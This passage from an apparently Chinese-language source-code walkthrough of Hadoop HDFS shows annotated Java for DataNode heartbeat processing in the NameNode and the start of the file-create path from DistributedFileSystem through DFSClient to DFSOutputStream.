class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> HeartbeatResponse <span class="title">sendHeartbeat</span><span class="params">(DatanodeRegistration nodeReg,</span></span></span><br><span class="line"><span class="function"><span class="params">    StorageReport[] report, <span class="keyword">long</span> dnCacheCapacity, <span class="keyword">long</span> dnCacheUsed,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> xmitsInProgress, <span class="keyword">int</span> xceiverCount,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> failedVolumes, VolumeFailureSummary volumeFailureSummary,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> requestFullBlockReportLease,</span></span></span><br><span class="line"><span class="function"><span class="params">    @Nonnull SlowPeerReports slowPeers,</span></span></span><br><span class="line"><span class="function"><span class="params">@Nonnull SlowDiskReports slowDisks)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  checkNNStartup();</span><br><span class="line">  verifyRequest(nodeReg);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理DN发送的心跳</span></span><br><span class="line">  <span class="keyword">return</span> namesystem.handleHeartbeat(nodeReg, report,</span><br><span class="line">      dnCacheCapacity, dnCacheUsed, xceiverCount, xmitsInProgress,</span><br><span class="line">      failedVolumes, volumeFailureSummary, requestFullBlockReportLease,</span><br><span class="line">      slowPeers, slowDisks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HeartbeatResponse <span class="title">handleHeartbeat</span><span class="params">(DatanodeRegistration nodeReg,</span></span></span><br><span class="line"><span class="function"><span class="params">    StorageReport[] reports, <span class="keyword">long</span> cacheCapacity, <span class="keyword">long</span> cacheUsed,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> xmitsInProgress, <span class="keyword">int</span> failedVolumes,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">boolean</span> requestFullBlockReportLease,</span></span></span><br><span class="line"><span class="function"><span class="params">    @Nonnull SlowPeerReports slowPeers,</span></span></span><br><span class="line"><span class="function"><span class="params">    @Nonnull SlowDiskReports slowDisks)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  readLock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//get datanode commands</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> maxTransfer = blockManager.getMaxReplicationStreams()</span><br><span class="line">        - xmitsInProgress;</span><br><span class="line">  <span class="comment">// 处理DN发送过来的心跳</span></span><br><span class="line">    DatanodeCommand[] cmds = blockManager.getDatanodeManager().handleHeartbeat(</span><br><span class="line">        nodeReg, reports, getBlockPoolId(), cacheCapacity, cacheUsed,</span><br><span class="line">        xceiverCount, maxTransfer, failedVolumes, volumeFailureSummary,</span><br><span class="line">        slowPeers, slowDisks);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> blockReportLeaseId = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (requestFullBlockReportLease) &#123;</span><br><span class="line">      blockReportLeaseId =  blockManager.requestBlockReportLeaseId(nodeReg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//create ha status</span></span><br><span class="line">    <span class="keyword">final</span> NNHAStatusHeartbeat haState = <span class="keyword">new</span> NNHAStatusHeartbeat(</span><br><span class="line">        haContext.getState().getServiceState(),</span><br><span class="line">        getFSImage().getCorrectLastAppliedOrWrittenTxId());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 响应DN的心跳</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> HeartbeatResponse(cmds, haState, rollingUpgradeInfo,</span><br><span class="line">        blockReportLeaseId);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    readUnlock(<span class="string">"handleHeartbeat"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> DatanodeCommand[] handleHeartbeat(DatanodeRegistration nodeReg,</span><br><span class="line">    StorageReport[] reports, <span class="keyword">final</span> String blockPoolId,</span><br><span class="line">    <span class="keyword">long</span> cacheCapacity, <span class="keyword">long</span> cacheUsed, <span class="keyword">int</span> xceiverCount, </span><br><span class="line">    <span class="keyword">int</span> maxTransfers, <span class="keyword">int</span> failedVolumes,</span><br><span class="line">    VolumeFailureSummary volumeFailureSummary,</span><br><span class="line">    <span class="meta">@Nonnull</span> SlowPeerReports slowPeers,</span><br><span class="line">    <span class="meta">@Nonnull</span> SlowDiskReports slowDisks) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  heartbeatManager.updateHeartbeat(nodeinfo, reports, cacheCapacity,</span><br><span class="line">      cacheUsed, xceiverCount, failedVolumes, volumeFailureSummary);</span><br><span class="line">  ... ...  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">updateHeartbeat</span><span class="params">(<span class="keyword">final</span> DatanodeDescriptor node,</span></span></span><br><span class="line"><span class="function"><span class="params">    StorageReport[] reports, <span class="keyword">long</span> cacheCapacity, <span class="keyword">long</span> cacheUsed,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> failedVolumes,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary)</span> </span>&#123;</span><br><span class="line">  stats.subtract(node);</span><br><span class="line">  blockManager.updateHeartbeat(node, reports, cacheCapacity, cacheUsed,</span><br><span class="line">      xceiverCount, failedVolumes, volumeFailureSummary);</span><br><span class="line">  stats.add(node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeartbeat</span><span class="params">(DatanodeDescriptor node, StorageReport[] reports,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">long</span> cacheCapacity, <span class="keyword">long</span> cacheUsed, <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> failedVolumes,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (StorageReport report: reports) &#123;</span><br><span class="line">    providedStorageMap.updateStorage(node, report.getStorage());</span><br><span class="line">  &#125;</span><br><span class="line">  node.updateHeartbeat(reports, cacheCapacity, cacheUsed, xceiverCount,</span><br><span class="line">      failedVolumes, volumeFailureSummary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeartbeat</span><span class="params">(StorageReport[] reports, <span class="keyword">long</span> cacheCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">long</span> cacheUsed, <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> volFailures,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary)</span> </span>&#123;</span><br><span class="line">  updateHeartbeatState(reports, cacheCapacity, cacheUsed, xceiverCount,</span><br><span class="line">      volFailures, volumeFailureSummary);</span><br><span class="line">  heartbeatedSinceRegistration = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHeartbeatState</span><span class="params">(StorageReport[] reports, <span class="keyword">long</span> cacheCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">long</span> cacheUsed, <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> volFailures,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 更新存储</span></span><br><span class="line">  updateStorageStats(reports, cacheCapacity, cacheUsed, xceiverCount,</span><br><span class="line">      volFailures, volumeFailureSummary);</span><br><span class="line">  <span class="comment">// 更新心跳时间</span></span><br><span class="line">  setLastUpdate(Time.now());</span><br><span class="line">  setLastUpdateMonotonic(Time.monotonicNow());</span><br><span class="line">  rollBlocksScheduled(getLastUpdateMonotonic());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateStorageStats</span><span class="params">(StorageReport[] reports, <span class="keyword">long</span> cacheCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">long</span> cacheUsed, <span class="keyword">int</span> xceiverCount, <span class="keyword">int</span> volFailures,</span></span></span><br><span class="line"><span class="function"><span class="params">    VolumeFailureSummary volumeFailureSummary)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> totalCapacity = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">long</span> totalRemaining = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">long</span> totalBlockPoolUsed = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">long</span> totalDfsUsed = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">long</span> totalNonDfsUsed = <span class="number">0</span>;</span><br><span class="line">  … …</span><br><span class="line"></span><br><span class="line">  setCacheCapacity(cacheCapacity);</span><br><span class="line">  setCacheUsed(cacheUsed);</span><br><span class="line">  setXceiverCount(xceiverCount);</span><br><span class="line">  <span class="keyword">this</span>.volumeFailures = volFailures;</span><br><span class="line">  <span class="keyword">this</span>.volumeFailureSummary = volumeFailureSummary;</span><br><span class="line">  <span class="keyword">for</span> (StorageReport report : reports) &#123;</span><br><span class="line"></span><br><span class="line">    DatanodeStorageInfo storage =</span><br><span class="line">        storageMap.get(report.getStorage().getStorageID());</span><br><span class="line">    <span class="keyword">if</span> (checkFailedStorages) &#123;</span><br><span class="line">      failedStorageInfos.remove(storage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    storage.receivedHeartbeat(report);</span><br><span class="line">    <span class="comment">// skip accounting for capacity of PROVIDED storages!</span></span><br><span class="line">    <span class="keyword">if</span> (StorageType.PROVIDED.equals(storage.getStorageType())) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    totalCapacity += report.getCapacity();</span><br><span class="line">    totalRemaining += report.getRemaining();</span><br><span class="line">    totalBlockPoolUsed += report.getBlockPoolUsed();</span><br><span class="line">    totalDfsUsed += report.getDfsUsed();</span><br><span class="line">    totalNonDfsUsed += report.getNonDfsUsed();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update total metrics for the node.</span></span><br><span class="line">  <span class="comment">// 更新存储相关信息</span></span><br><span class="line">  setCapacity(totalCapacity);</span><br><span class="line">  setRemaining(totalRemaining);</span><br><span class="line">  setBlockPoolUsed(totalBlockPoolUsed);</span><br><span class="line">  setDfsUsed(totalDfsUsed);</span><br><span class="line">  setNonDfsUsed(totalNonDfsUsed);</span><br><span class="line">  <span class="keyword">if</span> (checkFailedStorages) &#123;</span><br><span class="line">    updateFailedStorage(failedStorageInfos);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">long</span> storageMapSize;</span><br><span class="line">  <span class="keyword">synchronized</span> (storageMap) &#123;</span><br><span class="line">    storageMapSize = storageMap.size();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (storageMapSize != reports.length) &#123;</span><br><span class="line">    pruneStorageMap(reports);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>四、HDFS上传源码解析</h1><h2 id="1、概述-v3">1、概述</h2><p>HDFS的写数据流程</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335073.png" alt></p><p>HDFS上传源码解析</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335074.png" alt></p><h2 id="2、create创建过程">2、create创建过程</h2><h3 id="2-1-DN向NN发起创建请求">2.1 DN向NN发起创建请求</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPut2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  FSDataOutputStream fos = fs.create(<span class="keyword">new</span> Path(<span class="string">"/input"</span>));</span><br><span class="line"></span><br><span class="line">  fos.write(<span class="string">"hello world"</span>.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击create，一直到抽象方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> FSDataOutputStream <span class="title">create</span><span class="params">(Path f,</span></span></span><br><span class="line"><span class="function"><span class="params">  FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">boolean</span> overwrite,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> bufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">short</span> replication,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  Progressable progress)</span> <span class="keyword">throws</span> IOException</span>;</span><br></pre></td></tr></table></figure><p>ctrl+alt+B选择DistributedFileSystem实现方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FSDataOutputStream <span class="title">create</span><span class="params">(Path f, FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">boolean</span> overwrite, <span class="keyword">int</span> bufferSize, <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  Progressable progress)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.create(f, permission,</span><br><span class="line">  overwrite ? EnumSet.of(CreateFlag.CREATE, CreateFlag.OVERWRITE)</span><br><span class="line">    : EnumSet.of(CreateFlag.CREATE), bufferSize, replication,</span><br><span class="line">  blockSize, progress, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> FSDataOutputStream <span class="title">create</span><span class="params">(<span class="keyword">final</span> Path f, <span class="keyword">final</span> FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">final</span> EnumSet&lt;CreateFlag&gt; cflags, <span class="keyword">final</span> <span class="keyword">int</span> bufferSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">final</span> <span class="keyword">short</span> replication, <span class="keyword">final</span> <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">final</span> Progressable progress, <span class="keyword">final</span> ChecksumOpt checksumOpt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  statistics.incrementWriteOps(<span class="number">1</span>);</span><br><span class="line">  storageStatistics.incrementOpCounter(OpType.CREATE);</span><br><span class="line">  Path absF = fixRelativePart(f);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> FileSystemLinkResolver&lt;FSDataOutputStream&gt;() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FSDataOutputStream <span class="title">doCall</span><span class="params">(<span class="keyword">final</span> Path p)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建获取了一个输出流对象</span></span><br><span class="line">    <span class="keyword">final</span> DFSOutputStream dfsos = dfs.create(getPathName(p), permission,</span><br><span class="line">      cflags, replication, blockSize, progress, bufferSize,</span><br><span class="line">      checksumOpt);</span><br><span class="line">    <span class="comment">// 这里将上面创建的dfsos进行包装并返回</span></span><br><span class="line">    <span class="keyword">return</span> dfs.createWrappedOutputStream(dfsos, statistics);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FSDataOutputStream <span class="title">next</span><span class="params">(<span class="keyword">final</span> FileSystem fs, <span class="keyword">final</span> Path p)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fs.create(p, permission, cflags, bufferSize,</span><br><span class="line">      replication, blockSize, progress, checksumOpt);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;.resolve(<span class="keyword">this</span>, absF);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> DFSOutputStream <span class="title">create</span><span class="params">(String src, FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  Progressable progress, <span class="keyword">int</span> buffersize, ChecksumOpt checksumOpt)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> create(src, permission, flag, <span class="keyword">true</span>,</span><br><span class="line">  replication, blockSize, progress, buffersize, checksumOpt, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> DFSOutputStream <span class="title">create</span><span class="params">(String src, FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">long</span> blockSize, Progressable progress, <span class="keyword">int</span> buffersize,</span></span></span><br><span class="line"><span class="function"><span class="params">  ChecksumOpt checksumOpt, InetSocketAddress[] favoredNodes)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> create(src, permission, flag, createParent, replication, blockSize,</span><br><span class="line">  progress, buffersize, checksumOpt, favoredNodes, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> DFSOutputStream <span class="title">create</span><span class="params">(String src, FsPermission permission,</span></span></span><br><span class="line"><span class="function"><span class="params">  EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">boolean</span> createParent, <span class="keyword">short</span> replication,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">long</span> blockSize, Progressable progress, <span class="keyword">int</span> buffersize,</span></span></span><br><span class="line"><span class="function"><span class="params">  ChecksumOpt checksumOpt, InetSocketAddress[] favoredNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">  String ecPolicyName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  checkOpen();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">final</span> FsPermission masked = applyUMask(permission);</span><br><span class="line">  LOG.debug(<span class="string">"&#123;&#125;: masked=&#123;&#125;"</span>, src, masked);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">final</span> DFSOutputStream result = DFSOutputStream.newStreamForCreate(<span class="keyword">this</span>,</span><br><span class="line">    src, masked, flag, createParent, replication, blockSize, progress,</span><br><span class="line">    dfsClientConf.createChecksum(checksumOpt),</span><br><span class="line">    getFavoredNodesStr(favoredNodes), ecPolicyName);</span><br><span class="line">    </span><br><span class="line">  beginFileLease(result.getFileId(), result);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击newStreamForCreate，进入DFSOutputStream.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> DFSOutputStream <span class="title">newStreamForCreate</span><span class="params">(DFSClient dfsClient, String src,</span></span></span><br><span class="line"><span class="function"><span class="params">  FsPermission masked, EnumSet&lt;CreateFlag&gt; flag, <span class="keyword">boolean</span> createParent,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">short</span> replication, <span class="keyword">long</span> blockSize, Progressable progress,</span></span></span><br><span class="line"><span class="function"><span class="params">  DataChecksum checksum, String[] favoredNodes, String ecPolicyName)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> (TraceScope ignored =</span><br><span class="line">       dfsClient.newPathTraceScope(<span class="string">"newStreamForCreate"</span>, src)) &#123;</span><br><span class="line">    HdfsFileStatus stat = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retry the create if we get a RetryStartFileException up to a maximum</span></span><br><span class="line">    <span class="comment">// number of times</span></span><br><span class="line">    <span class="keyword">boolean</span> shouldRetry = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">int</span> retryCount = CREATE_RETRY_COUNT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (shouldRetry) &#123;</span><br><span class="line">    shouldRetry = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// DN将创建请求发送给NN（RPC）</span></span><br><span class="line">      stat = dfsClient.namenode.create(src, masked, dfsClient.clientName,</span><br><span class="line">        <span class="keyword">new</span> EnumSetWritable&lt;&gt;(flag), createParent, replication,</span><br><span class="line">        blockSize, SUPPORTED_CRYPTO_VERSIONS, ecPolicyName);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException re) &#123;</span><br><span class="line">      … ….</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Preconditions.checkNotNull(stat, <span class="string">"HdfsFileStatus should not be null!"</span>);</span><br><span class="line">    <span class="keyword">final</span> DFSOutputStream out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stat.getErasureCodingPolicy() != <span class="keyword">null</span>) &#123;</span><br><span class="line">    out = <span class="keyword">new</span> DFSStripedOutputStream(dfsClient, src, stat,</span><br><span class="line">      flag, progress, checksum, favoredNodes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    out = <span class="keyword">new</span> DFSOutputStream(dfsClient, src, stat,</span><br><span class="line">      flag, progress, checksum, favoredNodes, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启线程run，DataStreamer extends Daemon extends Thread</span></span><br><span class="line">    